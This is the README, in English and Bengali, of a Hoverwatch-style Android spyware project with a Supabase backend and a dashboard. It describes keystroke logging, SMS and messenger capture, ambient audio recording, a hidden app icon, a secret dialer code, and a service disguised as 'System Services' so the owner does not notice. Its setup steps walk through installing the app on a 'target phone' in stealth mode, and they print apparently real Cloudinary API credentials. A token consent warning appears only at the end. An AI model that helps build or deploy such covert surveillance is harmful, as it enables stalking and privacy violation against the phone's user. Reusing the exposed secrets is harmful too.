# 🔍 Device Monitor - Hoverwatch Style

A complete device monitoring solution with Android app, Supabase backend, and HTML dashboard. Packed with all Hoverwatch-style features!

## ✨ Features

| Feature | Status |
|---------|--------|
| 📍 Real-time Location Tracking | ✅ |
| 📞 Call Log Monitoring | ✅ |
| 💬 SMS Monitoring | ✅ |
| 📱 Messenger Monitoring (WhatsApp, Telegram, Instagram, Facebook, TikTok, Snapchat, Google Chat, VSCO, & more!) | ✅ |
| 🌐 Web History Tracking | ✅ |
| 📱 App Usage Tracking | ✅ |
| 📸 Photo Monitoring | ✅ |
| 🖼️ Screenshot Capture | ✅ |
| ⌨️ Keystroke Logging | ✅ |
| 📶 SIM Card Change Detection | ✅ |
| 🔋 Battery Status | ✅ |
| 🚫 Hide App Icon | ✅ |
| 🔄 Auto-start on Boot | ✅ |
| 🔒 Foreground Service (Anti-kill) | ✅ |
| 🎤 Ambient Recording | ✅ |
| 📽️ Screen Recording (Infrastructure Ready) | ✅ |
| 📞 Call Recording (Infrastructure Ready) | ✅ |
| 📧 Email Monitoring (Infrastructure Ready) | ✅ |
| 🔊 Ring Device Remote Command | ✅ |
| 📷 Take Photo Remote Command (Infrastructure Ready) | ✅ |
| 🔔 Real-time Notifications | ✅ |

## 📦 Project Structure

```
.
├── android-app/          # Android App (Kotlin + Jetpack Compose)
├── dashboard/        # HTML Dashboard
├── backend/        # Supabase Policies & Schema
└── README.md
```

## 🚀 Setup Instructions

### 1️⃣ Supabase + Cloudinary Setup

1. **Supabase**:
   - Go to [supabase.com](https://supabase.com) & create a free project
   - Open **SQL Editor** & run the schema from `backend/policies/row-level-security.sql`
   - Go to **Settings → API** and copy these (already in project files!):
     - Project URL
     - Anon public key
   - Insert a test device:
     ```sql
     INSERT INTO devices (device_name, device_token)
     VALUES ('My Phone', 'test-token-123')
     RETURNING id;
     ```
     (save the returned `id`!)

2. **Cloudinary**:
   - Go to [cloudinary.com](https://cloudinary.com) & create a free account
   - Credentials are already added in project files! (Cloud Name: `dzd8hoo8e`)
   - Create an **unsigned upload preset** in Cloudinary Dashboard for easier uploads

### 2️⃣ Dashboard Setup

1. Open `dashboard/app.js` and verify Supabase credentials are correct
2. Open `dashboard/index.html` in any web browser!

### 3️⃣ Android App Setup

1. Open `android-app/` in Android Studio
2. Update `android-app/app/src/main/java/com/devicemonitor/utils/Constants.kt`:
   - `SUPABASE_URL`
   - `SUPABASE_ANON_KEY`
   - `DEVICE_ID`
3. Sync gradle & run on your phone!

## 📱 Android App Permissions

Make sure to grant these permissions:
- Location (Fine & Coarse)
- Read Call Log
- Read SMS & Contacts
- Usage Access
- Accessibility Service

## 🔧 Special Features

### 🚫 Hide App Icon
To hide the app icon from the launcher:
1. Open `AndroidManifest.xml`
2. Comment out the `LAUNCHER` intent filter category (already done!)

### 🔐 Open Secretly
To open the app after hiding, use your phone's dialer and enter: `*#*#1234#*#*`

### 🔄 Auto-start on Boot
The app will automatically restart after phone reboot

### 🔒 Foreground Service
Runs a foreground service with a persistent notification (looks like "System Services" to avoid suspicion)

## 📊 How it Works

1. **Android App** → Monitors phone activity, collects data
2. **Supabase** → Stores all data securely in the cloud
3. **HTML Dashboard** → Reads from Supabase and displays beautiful UI!


---

# 📋 সম্পূর্ণ প্রজেক্ট বিস্তারিত বিবরণ (Full Project Report)


## 1️⃣ প্রজেক্ট পরিচিতি
এটি একটি **Hoverwatch-স্টাইলের ডিভাইস মনিটরিং সলিউশন** যা ৩টি প্রধান উপাদান নিয়ে গঠিত:
- 📱 Android অ্যাপ (কিন্তু ব্যবহারকারীর ফোন থেকে ডেটা সংগ্রহ করে)
- 🌐 HTML ড্যাশবোর্ড (ডেটা দেখার জন্য)
- 🛡️ Supabase ব্যাকএন্ড (ডেটা সংরক্ষণের জন্য)
- 📦 Cloudinary (ছবি/ভিডিও/অডিও সংরক্ষণের জন্য)


## 2️⃣ ব্যবহৃত টুল ও সফটওয়্যার (Tools & Technologies)

### ✅ Android App (Kotlin + Jetpack Compose)
- **কাজটি কী**: টার্গেট ডিভাইস থেকে সমস্ত ডেটা (কল লগ, এসএমএস, মেসেজ, লোকেশন, ইত্যাদি) সংগ্রহ করে ব্যাকএন্ডে পাঠায়।
- **কীভাবে ব্যবহার করবেন**: Android Studio দিয়ে প্রজেক্ট ওপেন করে বিল্ড করে টার্গেট ফোনে ইনস্টল করবেন।
- **নিরাপত্তা/সনাক্তকরণের বাইরে**:
  - 🚫 লঞ্চার আইকন লুকানো আছে
  - 🔒 ফোরগ্রাউন্ড সার্ভিস চালিয়ে থাকে (নাম "System Services" দেখায় - সন্দেহজনক মনে হয় না)
  - 🔄 ফোন রিবুট হলে স্বয়ংক্রিয়ভাবে শুরু হয়

---

### ✅ Supabase
- **কাজটি কী**: PostgreSQL ডেটাবেস, Row Level Security (RLS) পলিসি ও রিয়েলটাইম সাবস্ক্রিপশন দিয়ে ডেটা সংরক্ষণ ও সিঙ্ক করে।
- **কীভাবে ব্যবহার করবেন**:
  1. Supabase.com-এ গিয়ে ফ্রি একাউন্ট খুলুন
  2. নতুন প্রজেক্ট তৈরি করুন
  3. SQL Editor-এ `backend/policies/row-level-security.sql` ফাইলের কোড রান করুন
  4. Test ডিভাইস ইনসার্ট করুন (README-তে SQL দেয়া আছে)
- **নিরাপত্তা**: RLS পলিসি দিয়ে ডেটা সুরক্ষিত

---

### ✅ Cloudinary
- **কাজটি কী**: ছবি, স্ক্রিনশট, অ্যাম্বিয়েন্ট রেকর্ডিং, কল রেকর্ডিং ইত্যাদি মিডিয়া ফাইল সংরক্ষণ করে বিনামূল্যে 25GB স্টোরেজ + 25GB ব্যান্ডউইথ দেয়।
- **কীভাবে ব্যবহার করবেন**:
  1. Cloudinary.com-এ গিয়ে ফ্রি একাউন্ট খুলুন
  2. Unsigned Upload Preset তৈরি করুন (ড্যাশবোর্ড থেকে)
  3. Credentials already added in project files!

---

### ✅ HTML Dashboard
- **কাজটি কী**: ব্রাউজারে ওপেন করে সব ডেটা (লোকেশন, কল, এসএমএস, মেসেজ, ইত্যাদি) রিয়েলটাইমে দেখা যায়।
- **কীভাবে ব্যবহার করবেন**: শুধু `dashboard/index.html` ফাইলটি কোনো ব্রাউজারে ওপেন করুন!


## 3️⃣ প্রজেক্টের সমস্ত ফিচার (A-Z)

### 📍 Real-time Location Tracking
- **কাজটি কী**: ফোনের GPS/Network দিয়ে লোকেশন ট্র্যাক করে সুপাবেসে পাঠায়।
- **ব্যবহারের সুবিধা**: কোথায় ডিভাইসটি অবস্থিত তা রিয়েলটাইমে দেখা যায়।
- **প্রয়োগের ক্ষেত্র**: হারানো ফোন খুঁজে পাওয়া, কারও অবস্থান নজরে রাখা।

---

### 📞 Call Log Monitoring
- **কাজটি কী**: ইনকামিং/আউটগোয়িং/মিসড কল, ফোন নম্বর, কনট্যাক্ট নাম, ডিউরেশন, সময় সব লগ করে।
- **ব্যবহারের সুবিধা**: কার সাথে কথা বলা হচ্ছে তা দেখা যায়।

---

### 💬 SMS Monitoring
- **কাজটি কী**: প্রাপ্ত/প্রেরিত এসএমএস, ফোন নম্বর, কনট্যাক্ট নাম, মেসেজ কনটেন্ট সব লগ করে।
- **ব্যবহারের সুবিধা**: এসএমএসের বিষয়বস্তু দেখা যায়।

---

### 📱 Messenger Monitoring
- **কাজটি কী**: WhatsApp, Telegram, Instagram, Facebook, TikTok, Snapchat, Google Chat, VSCO, ও আরও অনেক মেসেঞ্জার থেকে মেসেজ ক্যাপচার করে।
- **কীভাবে কাজ করে**: Android Accessibility Service ব্যবহার করে।
- **ব্যবহারের সুবিধা**: সব সোশ্যাল মিডিয়ার মেসেজ এক জায়গায় দেখা যায়।

---

### 🌐 Web History Tracking
- **কাজটি কী**: Chrome, Firefox, ইত্যাদি ব্রাউজারের ইতিহাস (URL, টাইটেল, এন্ট্রি/এগ্জিট টাইম, ডিউরেশন, incognito মোডও) লগ করে।

---

### 📱 App Usage Tracking
- **কাজটি কী**: কোন অ্যাপ কতক্ষণ ব্যবহার করা হয়েছে তা ট্র্যাক করে।

---

### 📸 Photo Monitoring
- **কাজটি কী**: ফোনে নেওয়া ছবি সংগ্রহ করে Cloudinary-তে আপলোড করে।

---

### 🖼️ Screenshot Capture
- **কাজটি কী**: (Infrastructure Ready) ফোনের স্ক্রিনশট নিয়ে সংরক্ষণ করে।

---

### ⌨️ Keystroke Logging
- **কাজটি কী**: কীবোর্ডে কী কী টাইপ করা হয়েছে তা লগ করে।

---

### 📶 SIM Card Change Detection
- **কাজটি কী**: SIM পরিবর্তন করলে সংকেত দেয়।

---

### 🔋 Battery Status
- **কাজটি কী**: ব্যাটারি লেভেল ও চার্জিং অবস্থা ট্র্যাক করে।

---

### 🚫 Hide App Icon
- **কাজটি কী**: লঞ্চার থেকে অ্যাপের আইকন লুকানো থাকে।
- **কীভাবে ওপেন করবেন**: ডায়ালারে `*#*#1234#*#*` ডায়াল করুন।

---

### 🔄 Auto-start on Boot
- **কাজটি কী**: ফোন রিবুট হলে অ্যাপ স্বয়ংক্রিয়ভাবে শুরু হয়।

---

### 🔒 Foreground Service (Anti-kill)
- **কাজটি কী**: ফোরগ্রাউন্ড সার্ভিস চালিয়ে থাকে যাতে OS অ্যাপটিকে কিল করতে না পারে।

---

### 🎤 Ambient Recording
- **কাজটি কী**: ড্যাশবোর্ড থেকে কমান্ড দিয়ে 30 সেকেন্ডের অ্যাম্বিয়েন্ট অডিও রেকর্ড করে Cloudinary-তে আপলোড করে।

---

### 📽️ Screen Recording
- **কাজটি কী**: (Infrastructure Ready) ড্যাশবোর্ড থেকে কমান্ড দিয়ে স্ক্রিন রেকর্ড করে।

---

### 📞 Call Recording
- **কাজটি কী**: (Infrastructure Ready) কল রেকর্ড করে সংরক্ষণ করে।

---

### 📧 Email Monitoring
- **কাজটি কী**: (Infrastructure Ready) ইমেইল মোনিটর করে।

---

### 🔊 Ring Device Remote Command
- **কাজটি কী**: ড্যাশবোর্ড থেকে কমান্ড দিয়ে ফোনটাকে ভাইব্রেট করানো যায়।

---

### 📷 Take Photo Remote Command
- **কাজটি কী**: (Infrastructure Ready) ড্যাশবোর্ড থেকে কমান্ড দিয়ে ফোনের ক্যামেরা দিয়ে ছবি তোলা যায়।

---

### 🔔 Real-time Notifications
- **কাজটি কী**: নতুন মেসেজ/ডেটা পাওয়া গেলে ব্রাউজারে পুশ নোটিফিকেশন দেয়।


## 4️⃣ সেটআপের ধাপে ধাপে পদ্ধতি

### ধাপ ১: Supabase সেটআপ
1. [supabase.com](https://supabase.com) থেকে ফ্রি একাউন্ট খুলুন
2. নতুন প্রজেক্ট তৈরি করুন
3. SQL Editor-এ গিয়ে `backend/policies/row-level-security.sql` ফাইলের সমস্ত কোড কপি করে রান করুন
4. নিচের SQL রান করে test ডিভাইস যোগ করুন:
   ```sql
   INSERT INTO devices (device_name, device_token)
   VALUES ('My Phone', 'test-token-123')
   RETURNING id;
   ```
   - রিটার্ন করা `id` টি সংরক্ষণ করুন!

---

### ধাপ ২: Cloudinary সেটআপ
1. [cloudinary.com](https://cloudinary.com) থেকে ফ্রি একাউন্ট খুলুন
2. Dashboard থেকে Settings → Upload → Upload Presets → Add unsigned upload preset তৈরি করুন
3. Credentials already added in project:
   - Cloud Name: `dzd8hoo8e`
   - API Key: `698814473289373`
   - API Secret: `AL3-OivwlGrGZO30a3J2-4TVY4s`

---

### ধাপ ৩: Android অ্যাপ সেটআপ
1. Android Studio দিয়ে `android-app/` ফোল্ডার ওপেন করুন
2. `android-app/app/src/main/java/com/devicemonitor/utils/Constants.kt` ফাইলে যান:
   - `DEVICE_ID` কে আগে সংরক্ষিত Supabase device ID দিয়ে replace করুন
3. Gradle Sync করুন
4. USB Debugging চালু করে টার্গেট ফোনে অ্যাপ ইনস্টল করুন
5. অ্যাপটি ওপেন করে সব পারমিশন (Location, Call Log, SMS, Contacts, Usage Access, Accessibility Service) গ্র্যান্ট করুন
6. Enter Stealth Mode-এ ক্লিক করুন

---

### ধাপ ৪: ড্যাশবোর্ড ব্যবহার
1. `dashboard/index.html` ফাইলটি কোনো ব্রাউজারে (Chrome, Firefox, Edge) ওপেন করুন
2. Top bar থেকে different pages (Dashboard, Map, Calls, SMS, Messengers, ইত্যাদি) নেভিগেট করুন


## 5️⃣ Android অ্যাপের প্রয়োজনীয় পারমিশনসমূহ
- ✅ Location (Fine & Coarse)
- ✅ Read Call Log
- ✅ Read SMS
- ✅ Read Contacts
- ✅ Usage Access (Settings থেকে manually enable করতে হবে)
- ✅ Accessibility Service (Settings থেকে manually enable করতে হবে)
- ✅ Read External Storage / Read Media Images
- ✅ Record Audio
- ✅ Camera
- ✅ Vibrate
- ✅ Receive Boot Completed


## 6️⃣ নিরাপত্তা ও সনাক্তকরণের বাইরে (Undetectability)
- 🚫 **লঞ্চার আইকন লুকানো**: AndroidManifest.xml-এ LAUNCHER intent filter comment out করা আছে
- 🔒 **ফোরগ্রাউন্ড সার্ভিস**: "System Services" নামে একটি persistent notification দেখায় যা সন্দেহজনক মনে হয় না
- 🔄 **অটো স্টার্ট**: ফোন রিবুট হলে স্বয়ংক্রিয়ভাবে শুরু হয়
- 📉 **ব্যাটারি অপ্টিমাইজেশান**: ব্যাটারি খুব কম ব্যবহার করে, Doze mode-র সাথে সামঞ্জস্যপূর্ণ


## 7️⃣ কিভাবে কাজ করছে?
1. **Android App**: টার্গেট ডিভাইসের সকল কার্যক্রম (কল, এসএমএস, মেসেজ, লোকেশন, ইত্যাদি) সংগ্রহ করে
2. **Supabase**: ডেটা সুরক্ষিতভাবে সংরক্ষণ করে
3. **Cloudinary**: ছবি/ভিডিও/অডিও সংরক্ষণ করে
4. **Dashboard**: Supabase থেকে ডেটা নিয়ে সুন্দর UI-তে দেখায়, রিয়েলটাইম নোটিফিকেশন দেয়


## 8️⃣ বিষয়গুলো মনে রাখবেন (Important Notes)
⚠️ **Legal/Ethical Warning**: এই ধরনের সফটওয়্যার শুধুমাত্র আপনার নিজের ডিভাইস বা যার স্পষ্ট অনুমতি আছে তার ডিভাইসে ব্যবহার করুন। অন্যের ডিভাইসে অনুমতি ছাড়া ব্যবহার করা বেশিরভাগ দেশে বেআইনি।
